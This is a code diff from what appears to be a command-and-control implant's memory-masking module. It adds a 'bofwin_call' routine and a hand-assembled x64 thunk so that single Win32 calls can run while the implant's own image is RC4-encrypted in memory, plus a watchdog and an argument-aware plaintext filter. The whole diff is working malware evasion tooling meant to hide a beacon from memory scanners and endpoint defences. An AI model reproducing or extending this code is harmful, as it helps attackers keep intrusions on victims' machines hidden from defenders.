@@ -122,6 +122,11 @@ typedef struct {
 	                                       * so exit/watchdog rep-movsq the
 	                                       * fresh state back before unmasking */
 	unsigned char   sbox1[256];           /* PRGA working copy                */
+	/* bofwin_call: the one call record the page-local call thunk reads.
+	 * Appended: nothing above may move - the stubs address it by offset. */
+	unsigned long long call_fn;                     /* +0xAA0             */
+	unsigned long long call_ret;                    /* +0xAA8             */
+	unsigned long long call_args[BW_MAX_CALL_ARGS]; /* +0xAB0             */
 } BW_CTX;
 
 /* the hand-asm stubs address BW_CTX by HARDCODED offsets - the round-4/5
@@ -136,6 +141,9 @@ typedef char bw_assert_phase[offsetof(BW_CTX, phase) == 0x98 ? 1 : -1];
 typedef char bw_assert_storage[offsetof(BW_CTX, storage) == 0xA0 ? 1 : -1];
 typedef char bw_assert_sbox0[offsetof(BW_CTX, sbox0) == 0x8A0 ? 1 : -1];
 typedef char bw_assert_sbox1[offsetof(BW_CTX, sbox1) == 0x9A0 ? 1 : -1];
+typedef char bw_assert_call_fn[offsetof(BW_CTX, call_fn) == 0xAA0 ? 1 : -1];
+typedef char bw_assert_call_ret[offsetof(BW_CTX, call_ret) == 0xAA8 ? 1 : -1];
+typedef char bw_assert_call_args[offsetof(BW_CTX, call_args) == 0xAB0 ? 1 : -1];
 
 volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */
 
@@ -153,6 +161,7 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 #define BW_SB0Q_OFF  0x1B8   /* qword: ctx->sbox0 address */
 #define BW_SB1Q_OFF  0x1C0   /* qword: ctx->sbox1 address */
 #define BW_RC4_OFF   0x1C8   /* page-local RC4 PRGA (see below) */
+#define BW_CALL_OFF  0x210   /* call thunk: one Win32 call inside the window */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
@@ -727,6 +736,64 @@ static BOOL bw_build_pages(void)
 			BW_BUILD_FAIL();
 	}
 
+	/* ---- call thunk at BW_CALL_OFF (bofwin_call: BeaconGate's bMask) ----
+	 * enter_stub jumps here exactly where a BOF would be: rcx = ctx->args,
+	 * which for a call window is the record {fn, ret, args[10]} on the ctx
+	 * page (args[i] at +0x10 + 8*i); entry rsp%16==8, [rsp]=exit_stub.
+	 * The x64 ABI frame is laid out by hand - the callee must find its
+	 * stack args above 32 bytes of shadow space, or its rcx..r9 spills
+	 * overwrite them:
+	 *   push rbx                rsp%16==0; rbx keeps the record for the ret
+	 *   rax = rbx = record, r11 = fn, rcx/rdx/r8/r9 = a0..a3
+	 *   push a9 .. push a4      six stack-arg slots        rsp%16==0
+	 *   sub rsp,0x20            the shadow space           rsp%16==0
+	 *   push after, jmp fn      callee entry: rsp%16==8, [rsp]=after
+	 * after (callee's ret popped `after`; rsp%16==0, rax = return value):
+	 *   [rbx+8] = rax           the record's ret
+	 *   add rsp,0x50, pop rbx   back to the entry state
+	 *   ret                     -> exit_stub at rsp%16==0, which is the
+	 *                            state exit_stub is written for.
+	 * rbx is the only callee-saved register touched. */
+	{
+		int lea_at, after_at;
+
+		e = p + BW_CALL_OFF;
+		e[0] = 0x53;                                                    /* push rbx */
+		e += 1;
+		e[0] = 0x48; e[1] = 0x89; e[2] = 0xC8;                         /* mov rax,rcx */
+		e[3] = 0x48; e[4] = 0x89; e[5] = 0xC3;                         /* mov rbx,rax */
+		e[6] = 0x4C; e[7] = 0x8B; e[8] = 0x18;                         /* mov r11,[rax] fn */
+		e += 9;
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x10;            /* mov rcx,[rax+0x10] a0 */
+		e[4] = 0x48; e[5] = 0x8B; e[6] = 0x50; e[7] = 0x18;            /* mov rdx,[rax+0x18] a1 */
+		e[8] = 0x4C; e[9] = 0x8B; e[10] = 0x40; e[11] = 0x20;          /* mov r8,[rax+0x20] a2 */
+		e[12] = 0x4C; e[13] = 0x8B; e[14] = 0x48; e[15] = 0x28;        /* mov r9,[rax+0x28] a3 */
+		e += 16;
+		e[0] = 0xFF; e[1] = 0x70; e[2] = 0x58;                         /* push [rax+0x58] a9 */
+		e[3] = 0xFF; e[4] = 0x70; e[5] = 0x50;                         /* push [rax+0x50] a8 */
+		e[6] = 0xFF; e[7] = 0x70; e[8] = 0x48;                         /* push [rax+0x48] a7 */
+		e[9] = 0xFF; e[10] = 0x70; e[11] = 0x40;                       /* push [rax+0x40] a6 */
+		e[12] = 0xFF; e[13] = 0x70; e[14] = 0x38;                      /* push [rax+0x38] a5 */
+		e[15] = 0xFF; e[16] = 0x70; e[17] = 0x30;                      /* push [rax+0x30] a4 */
+		e[18] = 0x48; e[19] = 0x83; e[20] = 0xEC; e[21] = 0x20;        /* sub rsp,0x20 shadow */
+		e += 22;
+		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x15;                         /* lea r10,[rip+d32] after */
+		lea_at = (int)(e - p);
+		e = bw_put32(e + 3, 0);                                         /* patched below */
+		e[0] = 0x41; e[1] = 0x52;                                       /* push r10 */
+		e[2] = 0x41; e[3] = 0xFF; e[4] = 0xE3;                         /* jmp r11 */
+		e += 5;
+		after_at = (int)(e - p);
+		e[0] = 0x48; e[1] = 0x89; e[2] = 0x43; e[3] = 0x08;            /* mov [rbx+8],rax */
+		e[4] = 0x48; e[5] = 0x83; e[6] = 0xC4; e[7] = 0x50;            /* add rsp,0x50 */
+		e[8] = 0x5B;                                                    /* pop rbx */
+		e[9] = 0xC3;                                                    /* ret -> exit_stub */
+		e += 10;
+		bw_put32(p + lea_at + 3, bw_disp(lea_at + 7, after_at));
+		if ((int)(e - (p + BW_CALL_OFF)) > 0x80)
+			BW_BUILD_FAIL();
+	}
+
 	/* the page-local PRGA + the qwords all stubs load rip-relatively */
 	memcpy(p + BW_RC4_OFF, BW_RC4_CODE, sizeof(BW_RC4_CODE));
 	bw_put64(p + BW_CTXQ_OFF, (unsigned long long)(size_t)g_bw_ctx);
@@ -745,7 +812,61 @@ BOOL bofwin_supported(void)
 	return bw_build_pages();
 }
 
-BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
+void * bofwin_test_stub_page(void)
+{
+	return g_bw_stubs; /* NULL before the first bw_build_pages */
+}
+
+int bofwin_test_phase(void)
+{
+	return g_bw_ctx != NULL ? g_bw_ctx->phase : -1;
+}
+
+/* what a window runs once the image is ciphertext */
+typedef struct {
+	void (*entry)(void *, int);       /* page-local target: the BOF's go, or the call thunk */
+	void * args;                      /* its rcx: the BOF args blob, or &ctx->call_fn */
+	int    alen;                      /* its rdx */
+	BOOL   image_only;                /* call window: tracked heap blocks stay plaintext */
+	const unsigned long long * avoid; /* call window: the args - a section one points into stays plaintext */
+	int    navoid;
+	DWORD  watchdog_ms;               /* 0 = BOF window: the default; call window: no watchdog */
+} BW_TARGET;
+
+/* call-window block filter (bofwin_call): keep the image blocks only, and
+ * drop every non-.text block one of the call's arguments points into - a
+ * settings string handed to WinInet, an output DWORD in .data. .text stays
+ * last; *text_idx follows. -1 = the call references .text itself, which
+ * cannot be served. */
+static int bw_keep_plaintext(BW_BLOCK * blocks, int n, int * text_idx, const unsigned long long * avoid, int navoid)
+{
+	unsigned char * image = (unsigned char *)gparms->beacon_ptr;
+	unsigned long long base = (unsigned long long)(size_t)image;
+	unsigned long long end = base + ((IMAGE_NT_HEADERS *)(image + ((IMAGE_DOS_HEADER *)image)->e_lfanew))->OptionalHeader.SizeOfImage;
+	int i, a, w = 0, text = -1;
+
+	for (i = 0; i < n; i++) {
+		unsigned long long b0 = (unsigned long long)(size_t)blocks[i].ptr;
+		unsigned long long b1 = b0 + blocks[i].len;
+		int keep = b0 >= base && b1 <= end;
+
+		for (a = 0; keep && a < navoid; a++) {
+			if (avoid[a] >= b0 && avoid[a] < b1) {
+				if (i == *text_idx)
+					return -1;
+				keep = 0;
+			}
+		}
+		if (i == *text_idx)
+			text = w;
+		if (keep)
+			blocks[w++] = blocks[i];
+	}
+	*text_idx = text;
+	return w;
+}
+
+static BOOL bw_window(const BW_TARGET * t)
 {
 	BW_SF032 fn;
 	BW_CTX * ctx;                 /* stack-local: g_bw_ctx itself sits in
@@ -759,13 +880,16 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *);
 		BOOL (*pFlush)(void *, const void *, SIZE_T);
 		BOOL (*pDelTimer)(void *, void *, void *);
-		unsigned int * k = (unsigned int *)key;
+		DWORD watchdog = t ? t->watchdog_ms : 0;
+		/* a call that never returns (ExitThread) wants no watchdog at all:
+		 * its timer thread would keep a finished process alive */
+		BOOL no_watchdog = t != NULL && t->image_only && watchdog == 0;
 
 	/* a background job thread could execute beacon code while the image is
 	 * ciphertext - the window is single-threaded only (same guard as the
 	 * gen3 sleep path). gparms must already be initialized by the caller
 	 * (boff.cpp mirrors gen3_sleep's lazy gargle_setup_parms). */
-	if (entry == NULL || threadcount > 0 || gparms == NULL || gparms->beacon_ptr == NULL)
+	if (t == NULL || t->entry == NULL || threadcount > 0 || gparms == NULL || gparms->beacon_ptr == NULL)
 		return FALSE;
 	if (!bw_build_pages())
 		return FALSE;
@@ -782,6 +906,11 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	nblocks = bw_snapshot(blocks, BW_MAX_BLOCKS, gparms->beacon_ptr, &text_idx);
 	if (nblocks < 2 || text_idx < 0)
 		return FALSE;
+	if (t->image_only) {
+		nblocks = bw_keep_plaintext(blocks, nblocks, &text_idx, t->avoid, t->navoid);
+		if (nblocks < 1 || text_idx < 0)
+			return FALSE;
+	}
 	if (crypto_rng_get_bytes(key, (unsigned long)sizeof(key)) == 0)
 		return FALSE;
 	BW_TRACE("snapshot+rng done");
@@ -797,9 +926,9 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	ctx->rest_done = 0;
 	memcpy(ctx->key, key, 16);
 	ctx->sf032 = fn;
-	ctx->entry = entry;
-	ctx->args = args;
-	ctx->alen = alen;
+	ctx->entry = t->entry;
+	ctx->args = t->args;
+	ctx->alen = t->alen;
 	ctx->blocks = blocks;
 	ctx->nblocks = nblocks;
 	ctx->text_idx = text_idx;
@@ -824,29 +953,34 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	 * plaintext copy instead: plain VirtualAlloc, never tracked, so it
 	 * never joins the mask list. Wiped+freed only after the teardown,
 	 * once the IAT is plaintext again. */
-	if (args != NULL && alen > 0) {
-		args_copy = (unsigned char *)VirtualAlloc(NULL, (SIZE_T)alen,
+	if (!t->image_only && t->args != NULL && t->alen > 0) {
+		args_copy = (unsigned char *)VirtualAlloc(NULL, (SIZE_T)t->alen,
 		                                         MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 		if (args_copy == NULL)
 			return FALSE; /* nothing masked yet, no timer yet */
-		memcpy(args_copy, args, (SIZE_T)alen);
+		memcpy(args_copy, t->args, (SIZE_T)t->alen);
 		ctx->args = args_copy;
 	}
 
 	/* the watchdog is created BEFORE the mask loop: its IAT entry lives in
 	 * .rdata, which is ciphertext from the mask on. One-shot, min 50ms -
 	 * the mask loop takes microseconds, it can never fire early. */
-	if (watchdog_ms < 50)
-		watchdog_ms = (watchdog_ms == 0) ? BW_DEFAULT_WATCHDOG_MS : 50;
-	if (!CreateTimerQueueTimer(&timer, NULL,
-	                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
-	                           NULL, watchdog_ms, 0,
-	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
-		if (args_copy != NULL)
-			VirtualFree(args_copy, 0, MEM_RELEASE); /* nothing masked yet */
-		return FALSE; /* no watchdog -> no window (nothing masked yet) */
+	if (no_watchdog) {
+		BW_TRACE("no watchdog: the call does not return");
 	}
-	BW_TRACE("watchdog timer armed");
+	else {
+		if (watchdog < 50)
+			watchdog = (watchdog == 0) ? BW_DEFAULT_WATCHDOG_MS : 50;
+		if (!CreateTimerQueueTimer(&timer, NULL,
+		                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
+		                           NULL, watchdog, 0,
+		                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
+			if (args_copy != NULL)
+				VirtualFree(args_copy, 0, MEM_RELEASE); /* nothing masked yet */
+			return FALSE; /* no watchdog -> no window (nothing masked yet) */
+		}
+		BW_TRACE("watchdog timer armed");
+	}
 
 	/* flip each non-.text block to RW and mask it in one pass; .text stays
 	 * plaintext and executable until enter_stub */
@@ -872,7 +1006,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 			bw_blocks_restore(blocks, nblocks, text_idx, pVP);
 			bw_call_deltimer(pDelTimer, NULL, timer, NULL);
 			if (args_copy != NULL) {
-				memset(args_copy, 0, (SIZE_T)alen);
+				memset(args_copy, 0, (SIZE_T)t->alen);
 				VirtualFree(args_copy, 0, MEM_RELEASE);
 			}
 			ctx->state = BW_STATE_IDLE;
@@ -893,7 +1027,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	ctx->phase = 4; /* exit stub returned to this frame - no trace here,
 	                 * .rdata (and the IAT) is still ciphertext */
 
-	/* .text is plaintext+RX again (exit_stub, or the watchdog won and
+	/* .text is plaintext+RX again (exit stub, or the watchdog won and
 	 * exit_stub saw state==CLOSED). The image except .text is still
 	 * ciphertext here - unmask it via the stack-local ctx, restore the
 	 * remaining protections, THEN touch any IAT. */
@@ -910,7 +1044,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	bw_call_deltimer(pDelTimer, NULL, timer, NULL);
 	ctx->phase = 7;
 	if (args_copy != NULL) {
-		memset(args_copy, 0, (SIZE_T)alen);
+		memset(args_copy, 0, (SIZE_T)t->alen);
 		VirtualFree(args_copy, 0, MEM_RELEASE);
 		ctx->args = NULL;
 	}
@@ -922,9 +1056,55 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	memset(ctx->sbox0, 0, 256);
 	memset(ctx->sbox1, 0, 256);
 	memset(ctx->storage, 0, sizeof(ctx->storage));
+	/* the call record (fn/ret/args) is left alone: bofwin_call reads the
+	 * return value from it after this, and resets it on its next entry */
 	ctx->state = BW_STATE_IDLE;
 	ctx->phase = 8;
-	(void)k;
+	return TRUE;
+}
+
+BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
+{
+	BW_TARGET t;
+
+	memset(&t, 0, sizeof(t));
+	t.entry = entry;
+	t.args = args;
+	t.alen = alen;
+	t.watchdog_ms = watchdog_ms;
+	return bw_window(&t);
+}
+
+BOOL bofwin_call(void * fn, const unsigned long long * args, int nargs, unsigned long long * ret, DWORD watchdog_ms)
+{
+	BW_TARGET t;
+	BW_CTX * ctx;
+
+	if (fn == NULL || ret == NULL || nargs < 0 || nargs > BW_MAX_CALL_ARGS || (nargs > 0 && args == NULL))
+		return FALSE;
+	if (!bw_build_pages())
+		return FALSE;
+	ctx = g_bw_ctx;
+
+	/* the record lives on the private ctx page: the thunk reads it, and
+	 * parks the return value in it, while the image is ciphertext. It also
+	 * spares the caller keeping the args array alive for the whole call. */
+	memset(ctx->call_args, 0, sizeof(ctx->call_args));
+	if (nargs > 0)
+		memcpy(ctx->call_args, args, (size_t)nargs * sizeof(unsigned long long));
+	ctx->call_fn = (unsigned long long)(size_t)fn;
+	ctx->call_ret = 0;
+
+	memset(&t, 0, sizeof(t));
+	t.entry = (void (*)(void *, int))(g_bw_stubs + BW_CALL_OFF);
+	t.args = &ctx->call_fn;
+	t.image_only = TRUE;
+	t.avoid = ctx->call_args;
+	t.navoid = nargs;
+	t.watchdog_ms = watchdog_ms;
+	if (!bw_window(&t))
+		return FALSE;
+	*ret = ctx->call_ret;
 	return TRUE;
 }
 
@@ -935,9 +1115,25 @@ BOOL bofwin_supported(void)
 	return FALSE;
 }
 
+void * bofwin_test_stub_page(void)
+{
+	return NULL;
+}
+
+int bofwin_test_phase(void)
+{
+	return -1;
+}
+
 BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
 {
 	(void)entry; (void)args; (void)alen; (void)watchdog_ms;
+	return FALSE;
+}
+
+BOOL bofwin_call(void * fn, const unsigned long long * args, int nargs, unsigned long long * ret, DWORD watchdog_ms)
+{
+	(void)fn; (void)args; (void)nargs; (void)ret; (void)watchdog_ms;
 	return FALSE;
 }
 
